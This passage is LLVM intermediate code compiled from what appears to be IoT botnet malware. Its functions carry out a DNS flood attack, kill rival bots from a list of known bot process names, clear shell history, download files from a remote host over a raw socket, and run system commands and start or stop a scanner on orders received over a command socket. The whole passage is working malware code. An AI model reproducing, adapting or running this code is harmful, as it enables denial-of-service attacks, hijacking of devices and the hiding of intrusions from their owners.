  %94 = call i32 @close(i32 %87) #3
  br label %95

; <label>:95:                                     ; preds = %4, %89
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @dnsflood(i8* nocapture readonly) local_unnamed_addr #1 {
  %2 = alloca [100 x i8], align 16
  %3 = tail call i32 @listFork()
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %5, label %6

; <label>:5:                                      ; preds = %1
  ret void

; <label>:6:                                      ; preds = %1
  %7 = getelementptr inbounds i8, i8* %0, i64 8
  %8 = bitcast i8* %7 to i8**
  %9 = load i8*, i8** %8, align 8
  %10 = getelementptr inbounds i8, i8* %0, i64 16
  %11 = bitcast i8* %10 to i32*
  %12 = load i32, i32* %11, align 8
  %13 = getelementptr inbounds i8, i8* %0, i64 24
  %14 = bitcast i8* %13 to i32*
  %15 = load i32, i32* %14, align 8
  %16 = tail call i64 @time(i64* null) #3
  %17 = tail call i32 @getpid() #3
  %18 = zext i32 %17 to i64
  %19 = xor i64 %18, %16
  %20 = trunc i64 %19 to i32
  tail call void @init_rand(i32 %20)
  %21 = tail call i64 @time(i64* null) #3
  %22 = zext i32 %15 to i64
  %23 = add i64 %21, %22
  %24 = getelementptr inbounds [100 x i8], [100 x i8]* %2, i64 0, i64 0
  %sext = shl i64 %23, 32
  %25 = ashr exact i64 %sext, 32
  br label %26

; <label>:26:                                     ; preds = %53, %6
  %.0 = phi i32 [ 0, %6 ], [ %.1, %53 ]
  %27 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i64 0, i64 0))
  br label %28

; <label>:28:                                     ; preds = %48, %26
  %.1 = phi i32 [ %.0, %26 ], [ %49, %48 ]
  %29 = call i8* @fgets(i8* nonnull %24, i32 100, %struct._IO_FILE* %27)
  %30 = icmp eq i8* %29, null
  br i1 %30, label %53, label %31

; <label>:31:                                     ; preds = %28
  %32 = call i64 @strlen(i8* nonnull %24) #15
  %33 = add i64 %32, -1
  %34 = getelementptr inbounds [100 x i8], [100 x i8]* %2, i64 0, i64 %33
  %35 = load i8, i8* %34, align 1
  switch i8 %35, label %40 [
    i8 10, label %36
    i8 13, label %36
  ]

; <label>:36:                                     ; preds = %31, %31
  %37 = call i64 @strlen(i8* nonnull %24) #15
  %38 = add i64 %37, -1
  %39 = getelementptr inbounds [100 x i8], [100 x i8]* %2, i64 0, i64 %38
  store i8 0, i8* %39, align 1
  br label %40

; <label>:40:                                     ; preds = %31, %36
  call void @dns_send(i8* %9, i32 %12, i8* nonnull %24, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.420, i64 0, i64 0))
  %41 = load volatile i32, i32* @pps, align 4
  %42 = add i32 %41, 1
  store volatile i32 %42, i32* @pps, align 4
  %43 = load volatile i32, i32* @limiter, align 4
  %44 = icmp slt i32 %.1, %43
  br i1 %44, label %48, label %45

; <label>:45:                                     ; preds = %40
  %46 = load volatile i32, i32* @sleeptime, align 4
  %47 = call i32 @usleep(i32 %46) #3
  br label %48

; <label>:48:                                     ; preds = %40, %45
  %.2 = phi i32 [ 0, %45 ], [ %.1, %40 ]
  %49 = add nsw i32 %.2, 1
  %50 = call i64 @time(i64* null) #3
  %51 = icmp sgt i64 %50, %25
  br i1 %51, label %52, label %28

; <label>:52:                                     ; preds = %48
  call void @exit(i32 0) #17
  unreachable

; <label>:53:                                     ; preds = %28
  %54 = call i32 @fclose(%struct._IO_FILE* %27)
  br label %26
}

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @botkiller() local_unnamed_addr #12 {
  %1 = alloca [80 x i8], align 16
  %2 = getelementptr inbounds [80 x i8], [80 x i8]* %1, i64 0, i64 0
  br label %3

; <label>:3:                                      ; preds = %0, %3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i64 0, i64 0), i64 10, i32 1, i1 false)
  %4 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 0), align 16
  %5 = call i8* @strcat(i8* nonnull %2, i8* %4) #3
  %6 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i64 0, i64 0), i64 20, i32 1, i1 false)
  %7 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 0), align 16
  %8 = call i8* @strcat(i8* nonnull %2, i8* %7) #3
  %9 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i64 0, i64 0), i64 10, i32 1, i1 false)
  %10 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 1), align 8
  %11 = call i8* @strcat(i8* nonnull %2, i8* %10) #3
  %12 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i64 0, i64 0), i64 20, i32 1, i1 false)
  %13 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 1), align 8
  %14 = call i8* @strcat(i8* nonnull %2, i8* %13) #3
  %15 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i64 0, i64 0), i64 10, i32 1, i1 false)
  %16 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 2), align 16
  %17 = call i8* @strcat(i8* nonnull %2, i8* %16) #3
  %18 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i64 0, i64 0), i64 20, i32 1, i1 false)
  %19 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 2), align 16
  %20 = call i8* @strcat(i8* nonnull %2, i8* %19) #3
  %21 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i64 0, i64 0), i64 10, i32 1, i1 false)
  %22 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 3), align 8
  %23 = call i8* @strcat(i8* nonnull %2, i8* %22) #3
  %24 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i64 0, i64 0), i64 20, i32 1, i1 false)
  %25 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 3), align 8
  %26 = call i8* @strcat(i8* nonnull %2, i8* %25) #3
  %27 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i64 0, i64 0), i64 10, i32 1, i1 false)
  %28 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 4), align 16
  %29 = call i8* @strcat(i8* nonnull %2, i8* %28) #3
  %30 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i64 0, i64 0), i64 20, i32 1, i1 false)
  %31 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 4), align 16
  %32 = call i8* @strcat(i8* nonnull %2, i8* %31) #3
  %33 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i64 0, i64 0), i64 10, i32 1, i1 false)
  %34 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 5), align 8
  %35 = call i8* @strcat(i8* nonnull %2, i8* %34) #3
  %36 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i64 0, i64 0), i64 20, i32 1, i1 false)
  %37 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 5), align 8
  %38 = call i8* @strcat(i8* nonnull %2, i8* %37) #3
  %39 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i64 0, i64 0), i64 10, i32 1, i1 false)
  %40 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 6), align 16
  %41 = call i8* @strcat(i8* nonnull %2, i8* %40) #3
  %42 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i64 0, i64 0), i64 20, i32 1, i1 false)
  %43 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 6), align 16
  %44 = call i8* @strcat(i8* nonnull %2, i8* %43) #3
  %45 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i64 0, i64 0), i64 10, i32 1, i1 false)
  %46 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 7), align 8
  %47 = call i8* @strcat(i8* nonnull %2, i8* %46) #3
  %48 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i64 0, i64 0), i64 20, i32 1, i1 false)
  %49 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 7), align 8
  %50 = call i8* @strcat(i8* nonnull %2, i8* %49) #3
  %51 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i64 0, i64 0), i64 10, i32 1, i1 false)
  %52 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 8), align 16
  %53 = call i8* @strcat(i8* nonnull %2, i8* %52) #3
  %54 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i64 0, i64 0), i64 20, i32 1, i1 false)
  %55 = load i8*, i8** getelementptr inbounds ([193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 8), align 16
  %56 = call i8* @strcat(i8* nonnull %2, i8* %55) #3
  %57 = call i32 @system(i8* nonnull %2) #3
  %58 = call i32 @sleep(i32 5) #3
  br label %3
}

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() local_unnamed_addr #1 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.423, i64 0, i64 0)) #3
  %2 = tail call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.424, i64 0, i64 0)) #3
  %3 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.425, i64 0, i64 0)) #3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @binsBins() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %3, label %7

; <label>:3:                                      ; preds = %0
  %4 = load i8*, i8** @rekdevice, align 8
  %5 = tail call i32 @system(i8* %4) #3
  %6 = tail call i32 @sleep(i32 20) #3
  br label %9

; <label>:7:                                      ; preds = %0
  %8 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.426, i64 0, i64 0), i32 %1)
  br label %9

; <label>:9:                                      ; preds = %7, %3
  ret void
}

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @download(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca [1024 x i8], align 16
  %5 = alloca [4096 x i8], align 16
  %6 = tail call i32 @socket(i32 2, i32 1, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %86, label %8

; <label>:8:                                      ; preds = %2
  %9 = tail call i32 @strncmp(i8* %0, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.427, i64 0, i64 0), i64 7) #15
  %10 = icmp eq i32 %9, 0
  %11 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  br i1 %10, label %12, label %15

; <label>:12:                                     ; preds = %8
  %13 = getelementptr inbounds i8, i8* %0, i64 7
  %14 = call i8* @strcpy(i8* nonnull %11, i8* %13) #3
  br label %.preheader43

; <label>:15:                                     ; preds = %8
  %16 = call i8* @strcpy(i8* nonnull %11, i8* %0) #3
  br label %.preheader43

.preheader43:                                     ; preds = %15, %12
  %17 = call i64 @strlen(i8* nonnull %11) #15
  %18 = icmp eq i64 %17, 0
  br i1 %18, label %.critedge, label %.lr.ph58.preheader

.lr.ph58.preheader:                               ; preds = %.preheader43
  br label %.lr.ph58

; <label>:19:                                     ; preds = %.lr.ph58
  %20 = call i64 @strlen(i8* nonnull %11) #15
  %21 = icmp ult i64 %indvars.iv.next72, %20
  br i1 %21, label %.lr.ph58, label %.critedge.loopexit

.lr.ph58:                                         ; preds = %.lr.ph58.preheader, %19
  %indvars.iv71 = phi i64 [ %indvars.iv.next72, %19 ], [ 0, %.lr.ph58.preheader ]
  %22 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 %indvars.iv71
  %23 = load i8, i8* %22, align 1
  %24 = icmp eq i8 %23, 47
  %indvars.iv.next72 = add nuw i64 %indvars.iv71, 1
  br i1 %24, label %.critedge.loopexit, label %19

.critedge.loopexit:                               ; preds = %.lr.ph58, %19
  %.lcssa.ph = phi i64 [ %indvars.iv71, %.lr.ph58 ], [ %indvars.iv.next72, %19 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader43
  %.lcssa = phi i64 [ 0, %.preheader43 ], [ %.lcssa.ph, %.critedge.loopexit ]
  %25 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 %.lcssa
  store i8 0, i8* %25, align 1
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = call zeroext i16 @htons(i16 zeroext 80) #18
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = call i32 @inet_addr(i8* nonnull %11) #3
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  store i32 %29, i32* %30, align 4
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 3, i64 0
  %32 = bitcast i8* %31 to i64*
  store i64 0, i64* %32, align 4
  %33 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %34 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %33, i32 16) #3
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %36, label %86

; <label>:36:                                     ; preds = %.critedge
  %37 = getelementptr inbounds i8, i8* %25, i64 1
  %38 = call i32 (i32, i8*, ...) @sockprintf(i32 %6, i8* getelementptr inbounds ([132 x i8], [132 x i8]* @.str.428, i64 0, i64 0), i8* %37, i8* nonnull %11)
  %39 = call %struct._IO_FILE* @fopen(i8* %1, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.429, i64 0, i64 0))
  %40 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %41 = call i64 @recv(i32 %6, i8* nonnull %40, i64 4096, i32 0) #3
  %42 = trunc i64 %41 to i32
  %43 = icmp slt i32 %42, 1
  br i1 %43, label %.preheader39, label %.lr.ph56.preheader

.lr.ph56.preheader:                               ; preds = %36
  br label %.lr.ph56

.loopexit41:                                      ; preds = %69
  %44 = call i64 @recv(i32 %6, i8* nonnull %40, i64 4096, i32 0) #3
  %45 = trunc i64 %44 to i32
  %46 = icmp slt i32 %45, 1
  br i1 %46, label %.preheader39.loopexit81, label %.lr.ph56

.lr.ph56:                                         ; preds = %.lr.ph56.preheader, %.loopexit41
  %47 = phi i32 [ %45, %.loopexit41 ], [ %42, %.lr.ph56.preheader ]
  %48 = phi i64 [ %44, %.loopexit41 ], [ %41, %.lr.ph56.preheader ]
  %49 = icmp slt i32 %47, 4096
  br i1 %49, label %50, label %.lr.ph54.preheader

; <label>:50:                                     ; preds = %.lr.ph56
  %sext38 = shl i64 %48, 32
  %51 = ashr exact i64 %sext38, 32
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 %51
  store i8 0, i8* %52, align 1
  br label %.lr.ph54.preheader

.lr.ph54.preheader:                               ; preds = %.lr.ph56, %50
  %53 = sext i32 %47 to i64
  br label %.lr.ph54

.lr.ph54:                                         ; preds = %.lr.ph54.preheader, %69
  %indvars.iv69 = phi i64 [ 0, %.lr.ph54.preheader ], [ %indvars.iv.next70, %69 ]
  %54 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 %indvars.iv69
  %55 = call i32 @strncmp(i8* %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.430, i64 0, i64 0), i64 4) #15
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %57, label %69

; <label>:57:                                     ; preds = %.lr.ph54
  %58 = trunc i64 %indvars.iv69 to i32
  %59 = add nsw i32 %58, 4
  %60 = icmp slt i32 %59, %47
  br i1 %60, label %.lr.ph52.preheader, label %.preheader39

.lr.ph52.preheader:                               ; preds = %57
  %61 = sext i32 %59 to i64
  br label %.lr.ph52

.preheader39.loopexit:                            ; preds = %.lr.ph52
  br label %.preheader39

.preheader39.loopexit81:                          ; preds = %.loopexit41
  br label %.preheader39

.preheader39:                                     ; preds = %.preheader39.loopexit81, %.preheader39.loopexit, %36, %57
  %62 = call i64 @recv(i32 %6, i8* nonnull %40, i64 4096, i32 0) #3
  %63 = trunc i64 %62 to i32
  %64 = icmp slt i32 %63, 1
  br i1 %64, label %._crit_edge, label %.lr.ph49.preheader

.lr.ph49.preheader:                               ; preds = %.preheader39
  br label %.lr.ph49

.lr.ph52:                                         ; preds = %.lr.ph52, %.lr.ph52.preheader
  %indvars.iv66 = phi i64 [ %61, %.lr.ph52.preheader ], [ %indvars.iv.next67, %.lr.ph52 ]
  %65 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 %indvars.iv66
  %66 = load i8, i8* %65, align 1
  %67 = sext i8 %66 to i32
  %68 = call i32 @fputc(i32 %67, %struct._IO_FILE* %39)
  %indvars.iv.next67 = add nsw i64 %indvars.iv66, 1
  %lftr.wideiv = trunc i64 %indvars.iv.next67 to i32
  %exitcond68 = icmp eq i32 %lftr.wideiv, %47
  br i1 %exitcond68, label %.preheader39.loopexit, label %.lr.ph52

; <label>:69:                                     ; preds = %.lr.ph54
  %indvars.iv.next70 = add nuw nsw i64 %indvars.iv69, 1
  %70 = icmp slt i64 %indvars.iv.next70, %53
  br i1 %70, label %.lr.ph54, label %.loopexit41

.loopexit:                                        ; preds = %.lr.ph
  %71 = call i64 @recv(i32 %6, i8* nonnull %40, i64 4096, i32 0) #3
  %72 = trunc i64 %71 to i32
  %73 = icmp slt i32 %72, 1
  br i1 %73, label %._crit_edge.loopexit, label %.lr.ph49

.lr.ph49:                                         ; preds = %.lr.ph49.preheader, %.loopexit
  %74 = phi i32 [ %72, %.loopexit ], [ %63, %.lr.ph49.preheader ]
  %75 = phi i64 [ %71, %.loopexit ], [ %62, %.lr.ph49.preheader ]
  %76 = icmp slt i32 %74, 4096
  br i1 %76, label %77, label %.lr.ph.preheader

; <label>:77:                                     ; preds = %.lr.ph49
  %sext = shl i64 %75, 32
  %78 = ashr exact i64 %sext, 32
  %79 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 %78
  store i8 0, i8* %79, align 1
  br label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.lr.ph49, %77
  %wide.trip.count = zext i32 %74 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %80 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 %indvars.iv
  %81 = load i8, i8* %80, align 1
  %82 = sext i8 %81 to i32
  %83 = call i32 @fputc(i32 %82, %struct._IO_FILE* %39)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader39
  %84 = call i32 @fclose(%struct._IO_FILE* %39)
  %85 = call i32 @close(i32 %6) #3
  br label %86

; <label>:86:                                     ; preds = %.critedge, %2, %._crit_edge
  %.035 = phi i32 [ 0, %._crit_edge ], [ 3, %2 ], [ 1, %.critedge ]
  ret i32 %.035
}

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @fputc(i32, %struct._IO_FILE* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.431, i64 0, i64 0)) #15
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %39

; <label>:6:                                      ; preds = %2
  %7 = getelementptr inbounds i8*, i8** %1, i64 1
  %8 = load i8*, i8** %7, align 8
  %9 = tail call i32 @strcmp(i8* %8, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.432, i64 0, i64 0)) #15
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %11, label %15

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @system(i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.433, i64 0, i64 0)) #3
  tail call void @ClearHistory()
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %13, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.434, i64 0, i64 0))
  br label %15

; <label>:15:                                     ; preds = %6, %11
  %16 = load i8*, i8** %7, align 8
  %17 = tail call i32 @strcmp(i8* %16, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i64 0, i64 0)) #15
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %23

; <label>:19:                                     ; preds = %15
  %20 = tail call i32 @system(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.436, i64 0, i64 0)) #3
  tail call void @ClearHistory()
  %21 = load i32, i32* @mainCommSock, align 4
  %22 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %21, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.437, i64 0, i64 0))
  br label %23

; <label>:23:                                     ; preds = %15, %19
  %24 = load i8*, i8** %7, align 8
  %25 = tail call i32 @strcmp(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i64 0, i64 0)) #15
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %23
  %28 = tail call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.439, i64 0, i64 0)) #3
  tail call void @ClearHistory()
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.440, i64 0, i64 0))
  br label %31

; <label>:31:                                     ; preds = %23, %27
  %32 = load i8*, i8** %7, align 8
  %33 = tail call i32 @strcmp(i8* %32, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.441, i64 0, i64 0)) #15
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %35, label %39

; <label>:35:                                     ; preds = %31
  %36 = tail call i32 @system(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.442, i64 0, i64 0)) #3
  tail call void @ClearHistory()
  %37 = load i32, i32* @mainCommSock, align 4
  %38 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %37, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.443, i64 0, i64 0))
  br label %39

; <label>:39:                                     ; preds = %31, %2, %35
  %40 = load i8*, i8** %1, align 8
  %41 = tail call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i64 0, i64 0)) #15
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %43, label %46

; <label>:43:                                     ; preds = %39
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %44, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.444, i64 0, i64 0))
  br label %.loopexit

; <label>:46:                                     ; preds = %39
  %47 = tail call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.445, i64 0, i64 0)) #15
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %53

; <label>:49:                                     ; preds = %46
  %50 = load i32, i32* @mainCommSock, align 4
  %51 = tail call i32 @getdtablesize() #3
  %52 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %50, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i64 0, i64 0), i32 %51)
  br label %.loopexit

; <label>:53:                                     ; preds = %46
  %54 = tail call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i64 0, i64 0)) #15
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %59

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.446, i64 0, i64 0))
  tail call void @binsBins() #3
  br label %.loopexit

; <label>:59:                                     ; preds = %53
  %60 = tail call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.447, i64 0, i64 0)) #15
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %96

; <label>:62:                                     ; preds = %59
  %63 = getelementptr inbounds i8*, i8** %1, i64 1
  %64 = load i8*, i8** %63, align 8
  %65 = tail call i32 @strcmp(i8* %64, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i64 0, i64 0)) #15
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %74

; <label>:67:                                     ; preds = %62
  %68 = load i32, i32* @scanPid, align 4
  %69 = icmp eq i32 %68, 0
  br i1 %69, label %.loopexit, label %70

; <label>:70:                                     ; preds = %67
  %71 = tail call i32 @kill(i32 %68, i32 9) #3
  %72 = load i32, i32* @mainCommSock, align 4
  %73 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %72, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.448, i64 0, i64 0))
  store i32 0, i32* @scanPid, align 4
  br label %74

; <label>:74:                                     ; preds = %62, %70
  %75 = load i8*, i8** %63, align 8
  %76 = tail call i32 @strcmp(i8* %75, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.449, i64 0, i64 0)) #15
  %77 = icmp eq i32 %76, 0
  br i1 %77, label %78, label %96

; <label>:78:                                     ; preds = %74
  %79 = load i32, i32* @scanPid, align 4
  %80 = icmp eq i32 %79, 0
  br i1 %80, label %81, label %.loopexit

; <label>:81:                                     ; preds = %78
  %82 = tail call i32 @fork() #3
  %83 = tail call i64 @sysconf(i32 84) #3
  %.tr = trunc i64 %83 to i32
  %84 = shl i32 %.tr, 6
  %85 = icmp sgt i32 %82, 0
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %81
  store i32 %82, i32* @scanPid, align 4
  br label %.loopexit

; <label>:87:                                     ; preds = %81
  %88 = icmp eq i32 %82, -1
  br i1 %88, label %.loopexit, label %89

; <label>:89:                                     ; preds = %87
